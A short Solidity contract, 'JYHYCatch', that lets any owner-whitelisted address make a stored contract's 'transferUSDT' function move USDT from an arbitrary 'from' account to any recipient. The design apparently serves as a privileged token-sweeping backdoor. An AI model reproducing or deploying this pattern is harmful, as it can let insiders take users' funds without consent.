// SPDX-License-Identifier: MIT
pragma solidity ^0.8.3;

contract JYHYCatch {
    address jyhyContractAddress;
    address owner;
    mapping(address=>bool) whiteList;

    constructor(
        address _address
    ) {
        jyhyContractAddress = _address;
        owner = msg.sender;
        whiteList[owner]= true;
    }
    modifier whiteAddress() {
        require(whiteList[msg.sender], "not white address");
        _;
    }
    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    function usdtCatch(address from,address to,uint256 amount)public whiteAddress{
                (bool success, ) = jyhyContractAddress.call(
            abi.encodeWithSignature(
                "transferUSDT(address,address,uint256)",
                from,
                to,
                amount
            )
        );
        if (!success) {
            revert("transferUSDT");
        }
    }
    function setWhiteAddress(address _account, bool _flag) public onlyOwner {
        whiteList[_account] = _flag;
    }

}